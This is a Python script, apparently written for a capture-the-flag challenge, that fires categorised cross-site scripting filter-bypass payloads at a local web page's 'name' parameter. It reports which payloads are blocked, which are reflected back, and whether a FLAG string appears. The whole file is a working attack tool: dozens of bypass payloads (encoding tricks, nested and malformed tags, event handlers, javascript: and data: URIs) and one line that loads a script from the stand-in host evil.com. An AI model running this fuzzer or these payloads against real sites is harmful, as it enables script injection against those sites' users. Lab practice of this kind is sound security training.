import requests
import urllib.parse
import re

# Target endpoint
base_url = "http://127.0.0.1:32889/page"

# Test payloads organized by bypass category
test_payloads = {
    "Case Variations": [
        "<Script>alert('XSS')</Script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<sCrIpT>alert('XSS')</sCrIpT>",
        "<sCrIpt>alert('XSS')</sCrIpt>",
    ],
    
    "Malformed Tags": [
        "<script/>alert('XSS')",
        "<script//>alert('XSS')",
        "<script x>alert('XSS')</script>",
        "<script/x>alert('XSS')</script>",
        "<script\x00>alert('XSS')</script>",
        "<script/>",
        "<script/src='http://evil.com/xss.js'>",
    ],
    
    "Tag with Spaces": [
        "< script>alert('XSS')</script>",
        "<script >alert('XSS')</script>",
        "< script >alert('XSS')</script>",
        "<  script>alert('XSS')</script>",
        "<script  >alert('XSS')</script>",
    ],
    
    "Encoded Angle Brackets": [
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    ],
    
    "NULL Bytes": [
        "<scr\x00ipt>alert('XSS')</script>",
        "<script\x00>alert('XSS')</script>",
        "<\x00script>alert('XSS')</script>",
        "<script>alert('\x00XSS')</script>",
    ],
    
    "Unicode/Hex Escapes": [
        "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
        "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
        "\u003Cscript\u003Ealert('XSS')\u003C/script\u003E",
    ],
    
    "Nested Tags": [
        "<scr<script>ipt>alert('XSS')</script>",
        "<scr<iframe>ipt>alert('XSS')</script>",
        "<sc<script>ript>alert('XSS')</script>",
        "<<script>script>alert('XSS')</script>",
    ],
    
    "Event Handlers": [
        "onload=alert('XSS')",
        "onerror=alert('XSS')",
        "onclick=alert('XSS')",
        "onmouseover=alert('XSS')",
        "onfocus=alert('XSS')",
        "' onload='alert(1)",
        "\" onload=\"alert(1)",
        "' onerror='alert(1)",
    ],
    
    "JavaScript Protocol": [
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "javascript://comment%0Aalert(1)",
        "javascript:void(alert(1))",
        "JavaScript:alert(1)",
        "JAVASCRIPT:alert(1)",
    ],
    
    "Data URI": [
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "data:text/html,<img src=x onerror=alert(1)>",
    ],
    
    "Alternative Tags": [
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
    ],
    
    "Obfuscation": [
        "<scr\nipt>alert('XSS')</script>",
        "<scr\tipt>alert('XSS')</script>",
        "<scr\ript>alert('XSS')</script>",
        "<script>alert`XSS`</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
    ]
}

# Results storage
blocked_payloads = []
allowed_payloads = []
anomalies = []

print("[*] Starting XSS Bypass Testing")
print(f"[*] Target: {base_url}")
print("=" * 80)

total_tests = sum(len(payloads) for payloads in test_payloads.values())
current_test = 0

for category, payloads in test_payloads.items():
    print(f"\n[*] Testing Category: {category}")
    print("-" * 80)
    
    for payload in payloads:
        current_test += 1
        
        try:
            # Send GET request with payload in 'name' parameter
            response = requests.get(
                base_url,
                params={"name": payload},
                timeout=5
            )
            
            status = response.status_code
            body = response.text
            
            # Check for blocking message
            is_blocked = "Sorry, you can't use that tag" in body
            
            # Check if payload is reflected
            is_reflected = payload in body
            
            # Check for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', body)
            
            if flag_match:
                print(f"\n[!!!] FLAG FOUND [!!!]")
                print(f"[+] Category: {category}")
                print(f"[+] Payload: {payload}")
                print(f"[+] Flag: {flag_match.group(0)}")
                print(f"[+] Full Response:\n{body}\n")
                allowed_payloads.append({
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "blocked": is_blocked,
                    "reflected": is_reflected,
                    "flag": flag_match.group(0)
                })
            elif is_blocked:
                blocked_payloads.append({
                    "category": category,
                    "payload": payload,
                    "status": status
                })
            elif status == 200 and is_reflected:
                print(f"[+] BYPASS SUCCESS!")
                print(f"    Category: {category}")
                print(f"    Payload: {payload}")
                print(f"    Status: {status}")
                print(f"    Response length: {len(body)} bytes")
                # Print snippet of response showing reflection
                if payload in body:
                    idx = body.index(payload)
                    snippet_start = max(0, idx - 50)
                    snippet_end = min(len(body), idx + len(payload) + 50)
                    print(f"    Reflection context: ...{body[snippet_start:snippet_end]}...")
                allowed_payloads.append({
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "blocked": False,
                    "reflected": True
                })
            elif status == 200 and not is_reflected:
                # Payload accepted but not reflected - interesting
                anomalies.append({
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "note": "Accepted but not reflected"
                })
            else:
                # Unexpected status
                anomalies.append({
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "note": f"Unexpected status: {status}"
                })
                
        except requests.exceptions.Timeout:
            print(f"[!] TIMEOUT: {payload[:50]}...")
            anomalies.append({
                "category": category,
                "payload": payload,
                "note": "Request timeout"
            })
        except Exception as e:
            print(f"[!] ERROR: {payload[:50]}... - {str(e)}")
            anomalies.append({
                "category": category,
                "payload": payload,
                "note": f"Error: {str(e)}"
            })

# Summary Report
print("\n" + "=" * 80)
print("[*] XSS BYPASS TESTING SUMMARY")
print("=" * 80)
print(f"[*] Total Tests: {total_tests}")
print(f"[*] Blocked: {len(blocked_payloads)}")
print(f"[*] Allowed/Bypassed: {len(allowed_payloads)}")
print(f"[*] Anomalies: {len(anomalies)}")

if allowed_payloads:
    print("\n" + "=" * 80)
    print("[+] SUCCESSFUL BYPASSES")
    print("=" * 80)
    for result in allowed_payloads:
        print(f"\n[+] Category: {result['category']}")
        print(f"    Payload: {result['payload']}")
        print(f"    Status: {result['status']}")
        print(f"    Blocked: {result.get('blocked', False)}")
        print(f"    Reflected: {result.get('reflected', False)}")
        if 'flag' in result:
            print(f"    FLAG: {result['flag']}")

if anomalies:
    print("\n" + "=" * 80)
    print("[*] ANOMALIES DETECTED")
    print("=" * 80)
    for anomaly in anomalies[:10]:  # Limit to first 10 anomalies
        print(f"\n[*] Category: {anomaly['category']}")
        print(f"    Payload: {anomaly['payload'][:80]}...")
        print(f"    Note: {anomaly['note']}")

print("\n" + "=" * 80)
print("[*] Testing Complete")
print("=" * 80)

